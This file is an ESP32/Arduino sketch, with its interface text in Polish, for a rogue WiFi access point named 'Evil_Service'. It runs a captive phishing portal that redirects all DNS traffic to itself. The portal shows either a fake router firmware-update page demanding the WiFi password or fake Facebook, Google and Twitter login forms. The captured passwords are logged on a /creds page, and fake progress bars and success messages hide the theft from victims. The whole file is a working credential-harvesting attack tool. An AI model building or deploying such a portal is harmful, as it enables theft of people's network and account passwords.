#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>

// ======== CONFIG ========
String SUBTITLE = "";
String currentPortal = "router"; // domyślna strona

// Napisy portalu aktualizacji routera
const String UPDATE_TITLE = "Wymagana aktualizacja oprogramowania sieciowego";
const String UPDATE_BODY = "Aby zakończyć proces aktualizacji, wprowadź hasło do swojej sieci WiFi";
const String UPDATE_POST_TITLE = "Trwa aktualizacja systemu...";
const String UPDATE_POST_BODY = "Proszę nie przerywać procesu - może to potrwać kilka minut...";

// Napisy portalu social media
const String LOGIN_TITLE = "Zaloguj się przez media społecznościowe";
const String LOGIN_BODY = "Wybierz metodę logowania i podaj dane";
const String LOGIN_POST_TITLE = "Trwa logowanie...";
const String LOGIN_POST_BODY = "Proszę czekać, łączymy...";

const String PASS_TITLE = "/LOGS/";
const String CLEAR_TITLE = "Wyczyść Dane";
const String CONFIG_TITLE = "Konfiguracja Systemu";

// ======== AP NAME ========
String currentSSID = "Evil_Service";
const String defaultSSID = "Evil_Service";
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1);

// ======== GLOBALS ========
DNSServer dnsServer;
WebServer webServer(80);

String Credentials = "";

// ======== HTML HELPERS ========
String header(String t, bool light=false) {
  String CSS;
  if(light) {
    CSS = "body{font-family:'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:#f5f7f9;color:#333;margin:0;padding:0;min-height:100vh;}"
          "nav{background:linear-gradient(135deg,#42a5f5,#6ec6ff);color:white;padding:1.5em;border-radius:0 0 20px 20px;box-shadow:0 4px 12px rgba(0,0,0,0.1);}"
          "nav b{display:block;font-size:1.5em;font-weight:600;margin-bottom:0.3em;}"
          ".container{max-width:600px;margin:2em auto;padding:0 1em;}"
          ".card{background:#fff;border-radius:12px;padding:2em;margin-bottom:1.5em;box-shadow:0 8px 16px rgba(0,0,0,0.1);border:1px solid #e0e0e0;}"
          "h1{color:#333;margin-top:0;font-weight:500;}"
          "p{color:#555;line-height:1.6;}"
          "input,select{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:1px solid #ccc;background:#fff;color:#333;font-size:16px;box-sizing:border-box;transition:all 0.3s ease;}"
          "input:focus,select:focus{outline:none;border-color:#42a5f5;}"
          "button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;background:linear-gradient(135deg,#42a5f5,#6ec6ff);color:white;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s ease;box-shadow:0 4px 8px rgba(0,0,0,0.1);}"
          "button:hover{transform:translateY(-2px);box-shadow:0 6px 12px rgba(0,0,0,0.15);}"
          "button:active{transform:translateY(0);}"
          ".social-btn{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;color:white;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s ease;}"
          ".facebook{background:#4267B2;}"
          ".google{background:#DB4437;}"
          ".twitter{background:#1DA1F2;}"
          ".progress-container{width:100%;background:#e0e0e0;border-radius:8px;margin:2em 0;}"
          ".progress-bar{width:0%;height:24px;background:linear-gradient(135deg,#00c853,#5efc82);border-radius:8px;transition:width 0.5s ease;display:flex;align-items:center;justify-content:center;color:#000;font-weight:500;}"
          "ol{padding-left:1.5em;}"
          "li{margin-bottom:0.8em;color:#555;}"
          "a{color:#42a5f5;text-decoration:none;transition:color 0.2s ease;}"
          "a:hover{color:#6ec6ff;}"
          ".success-badge{background:linear-gradient(135deg,#00c853,#5efc82);color:#000;padding:0.5em 1em;border-radius:20px;font-weight:600;display:inline-block;margin-bottom:1em;box-shadow:0 4px 8px rgba(0,200,83,0.2);}";
  } else {
    CSS = "body{font-family:'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:#121212;color:#e0e0e0;margin:0;padding:0;min-height:100vh;}"
          "nav{background:linear-gradient(135deg,#0062ff,#2b83f6);color:white;padding:1.5em;border-radius:0 0 20px 20px;box-shadow:0 4px 12px rgba(0,0,0,0.2);}"
           "nav b{display:block;font-size:1.5em;font-weight:600;margin-bottom:0.3em;}"
           ".container{max-width:600px;margin:2em auto;padding:0 1em;}"
           ".card{background:#1e1e1e;border-radius:12px;padding:2em;margin-bottom:1.5em;box-shadow:0 8px 16px rgba(0,0,0,0.2);border:1px solid #333;}"
           "h1{color:#fff;margin-top:0;font-weight:500;}"
           "p{color:#b0b0b0;line-height:1.6;}"
           "input,select{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;background:#2d2d2d;color:#fff;font-size:16px;box-sizing:border-box;transition:all 0.3s ease;border:1px solid #333;}"
           "input:focus,select:focus{outline:none;border-color:#0062ff;background:#333;}"
           "button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;background:linear-gradient(135deg,#0062ff,#2b83f6);color:white;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s ease;box-shadow:0 4px 8px rgba(0,0,0,0.2);}"
           "button:hover{transform:translateY(-2px);box-shadow:0 6px 12px rgba(0,0,0,0.3);}"
           "button:active{transform:translateY(0);}"
           ".progress-container{width:100%;background:#2d2d2d;border-radius:8px;margin:2em 0;}"
           ".progress-bar{width:0%;height:24px;background:linear-gradient(135deg,#00c853,#5efc82);border-radius:8px;transition:width 0.5s ease;display:flex;align-items:center;justify-content:center;color:#000;font-weight:500;}"
           "ol{padding-left:1.5em;}"
           "li{margin-bottom:0.8em;color:#b0b0b0;}"
           "a{color:#2b83f6;text-decoration:none;transition:color 0.2s ease;}"
           "a:hover{color:#5da8ff;}"
           ".success-badge{background:linear-gradient(135deg,#00c853,#5efc82);color:#000;padding:0.5em 1em;border-radius:20px;font-weight:600;display:inline-block;margin-bottom:1em;box-shadow:0 4px 8px rgba(0,200,83,0.3);}";
  }
  return "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name=viewport content='width=device-width, initial-scale=1'>"
         "<title>" + currentSSID + " :: " + t + "</title><style>" + CSS + "</style>"
         "</head><body><nav><b>" + currentSSID + "</b>" + SUBTITLE + "</nav>"
         "<div class=container><div class=card>";
}

String footer() {
  return "</div></div><div style='text-align:center;padding:2em 0;color:#666;font-size:0.9em;'>&copy; Evil Service</div></body></html>";
}

String input(String arg) {
  String v = webServer.arg(arg);
  v.replace("<", "&lt;");
  v.replace(">", "&gt;");
  return v.substring(0, 200);
}

// ======== PAGES ========

// ----- Router update pages -----
String routerIndex() {
  SUBTITLE = "Aktualizacja Routera";
  return header(UPDATE_TITLE) +
    "<h1>" + UPDATE_TITLE + "</h1>" 
    "<p>" + UPDATE_BODY + "</p>" 
    "<form action='/post' method='post'>" 
    "<input type=password name=password placeholder='Wprowadź hasło WiFi' required>" 
    "<button type=submit>Rozpocznij aktualizację</button>" 
    "</form>" + footer();
}

String routerPosted() {
  String password = input("password");
  Credentials += "<li><b>Hasło WiFi:</b> " + password + "</li>";
  String progress = "<h1>" + UPDATE_POST_TITLE + "</h1>" 
                   "<p>" + UPDATE_POST_BODY + "</p>" 
                   "<div class=progress-container><div class=progress-bar id=progress>0%</div></div>" 
                   "<script>var i=0;var progress=setInterval(function(){i++;document.getElementById('progress').style.width=i+'%';document.getElementById('progress').innerHTML=i+'%';if(i>=100){clearInterval(progress);setTimeout(function(){window.location.href='/success';},500);}},50);</script>";
  SUBTITLE = "Aktualizacja Routera";
  return header(UPDATE_POST_TITLE) + progress + footer();
}

String routerSuccess() {
  SUBTITLE = "Aktualizacja Routera";
  return header("Aktualizacja Zakończona") +
    "<div class=success-badge>AKTUALIZACJA ZAKOŃCZONA POMYŚLNIE</div>" 
    "<h1>Twój router został zaktualizowany</h1>" 
    "<p>System został pomyślnie zaktualizowany do najnowszej wersji.</p>" 
    + footer();
}

// ----- Social login pages -----
String socialIndex() {
  SUBTITLE = "Darmowe WiFi";
  return header(LOGIN_TITLE, true) +
    "<h1>" + LOGIN_TITLE + "</h1>"\
    "<p>" + LOGIN_BODY + "</p>"\
    "<div>"\
    "<button type=button class='social-btn facebook' onclick=\"showForm('Facebook')\">Facebook</button>"\
    "<button type=button class='social-btn google' onclick=\"showForm('Google')\">Google</button>"\
    "<button type=button class='social-btn twitter' onclick=\"showForm('Twitter')\">Twitter</button>"\
    "</div>"\
    "<form id='loginForm' action='/post' method='post' style='display:none;'>"\
    "<input type='hidden' name='provider' id='providerField'>"\
    "<input name='username' placeholder='Email lub telefon' required>"\
    "<input type=password name='password' placeholder='Hasło' required>"\
    "<button type=submit>Zaloguj</button>"\
    "</form>"\
    "<script>function showForm(p){document.getElementById('providerField').value=p;document.getElementById('loginForm').style.display='block';}</script>"\
    + footer();
}


String socialPosted() {
  String provider = input("provider");
  String user = input("username");
  String pass = input("password");
  Credentials += "<li><b>" + provider + ":</b> " + user + " / " + pass + "</li>";
  String progress = "<h1>" + LOGIN_POST_TITLE + "</h1>" 
                   "<p>" + LOGIN_POST_BODY + "</p>" 
                   "<div class=progress-container><div class=progress-bar id=progress>0%</div></div>" 
                   "<script>var i=0;var progress=setInterval(function(){i++;document.getElementById('progress').style.width=i+'%';document.getElementById('progress').innerHTML=i+'%';if(i>=100){clearInterval(progress);setTimeout(function(){window.location.href='/success';},500);}},50);</script>";
  SUBTITLE = "Darmowe WiFi";
  return header(LOGIN_POST_TITLE, true) + progress + footer();
}

String socialSuccess() {
  SUBTITLE = "Darmowe WiFi";
  return header("Zalogowano", true) +
    "<div class=success-badge>ZALOGOWANO POMYŚLNIE</div>" 
    "<h1>Jesteś połączony</h1>" 
    "<p>Możesz teraz korzystać z internetu.</p>" 
    + footer();
}

// ----- Logs & Settings -----
String creds() {
  SUBTITLE = "Logi";
  String optRouter = currentPortal == "router" ? "selected" : "";
  String optSocial = currentPortal == "social" ? "selected" : "";
  return header(PASS_TITLE) +
    "<h1>" + PASS_TITLE + "</h1>" 
    "<ol>" + Credentials + "</ol><br>" 
    "<form action='/updateconfig' method='post'>" 
    "<h2>Zmień nazwę sieci (AP)</h2>" 
    "<input name='ssid' value='" + currentSSID + "' placeholder='Nazwa sieci (SSID)' required>" 
    "<h2>Wybierz portal</h2>" 
    "<select name='portal'>" 
    "<option value='router' " + optRouter + ">Router Update</option>" 
    "<option value='social' " + optSocial + ">Social media login</option>" 
    "</select>" 
    "<button type='submit'>Zapisz</button></form>" 
    "<form action='/clear' method='post'>" 
    "<button type='submit'>Wyczyść Dane</button></form>" 
    "<p style='text-align:center;margin-top:1.5em;'><a href='/'>Powrót</a></p>" 
    + footer();
}

String updateConfig() {
  String newSSID = input("ssid");
  String newPortal = input("portal");
  if (newSSID.length() > 0 && newSSID.length() < 32) {
    currentSSID = newSSID;
    WiFi.softAP(currentSSID.c_str());
  }
  if (newPortal == "router" || newPortal == "social") {
    currentPortal = newPortal;
  }
  SUBTITLE = "Config";
  if (newSSID.length() > 0 && newSSID.length() < 32) {
    return header(CONFIG_TITLE) +
      "<h1>" + CONFIG_TITLE + "</h1>" 
      "<p>Nazwa sieci (SSID) została zmieniona na: <b>" + currentSSID + "</b></p>" 
      "<p style='text-align:center;'><a href='/'>Powrót do strony głównej</a></p>" 
      + footer();
  }
  return header(CONFIG_TITLE) +
    "<h1>" + CONFIG_TITLE + "</h1>" 
    "<p style='color:#ff6b6b;'>Błąd: Nazwa sieci musi zawierać od 1 do 32 znaków.</p>" 
    "<p style='text-align:center;'><a href='/creds'>Spróbuj ponownie</a></p>" 
    + footer();
}

String clearData() {
  currentSSID = defaultSSID;
  Credentials = "";
  WiFi.softAP(currentSSID.c_str());
  SUBTITLE = "Logi";
  return header(CLEAR_TITLE) +
    "<h1>Dane wyczyszczone</h1>" 
    "<p>Wszystkie dane zostały usunięte. Nazwa sieci przywrócona do domyślnej: <b>" + currentSSID + "</b></p>" 
    "<p style='text-align:center;'><a href='/'>Powrót</a></p>" 
    + footer();
}

// ======== SETUP ========
void setup() {
  delay(1000);
  Serial.begin(115200);
  if(!LittleFS.begin(true)) {
    Serial.println("LittleFS init failed");
  }

  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(currentSSID.c_str());
  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.onNotFound([](){ webServer.sendHeader("Location", String("http://") + APIP.toString(), true); webServer.send(302, "text/plain", ""); });

  webServer.on("/", [](){
    if(currentPortal == "social") webServer.send(200, "text/html", socialIndex());
    else webServer.send(200, "text/html", routerIndex());
  });
  webServer.on("/post", [](){
    if(currentPortal == "social") webServer.send(200, "text/html", socialPosted());
    else webServer.send(200, "text/html", routerPosted());
  });
  webServer.on("/success", [](){
    if(currentPortal == "social") webServer.send(200, "text/html", socialSuccess());
    else webServer.send(200, "text/html", routerSuccess());
  });

  webServer.on("/creds", [](){ webServer.send(200, "text/html", creds()); });
  webServer.on("/updateconfig", [](){ webServer.send(200, "text/html", updateConfig()); });
  webServer.on("/clear", [](){ webServer.send(200, "text/html", clearData()); });

  webServer.on("/generate_204", [](){ webServer.sendHeader("Location", "/", true); webServer.send(302, "text/plain", ""); });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

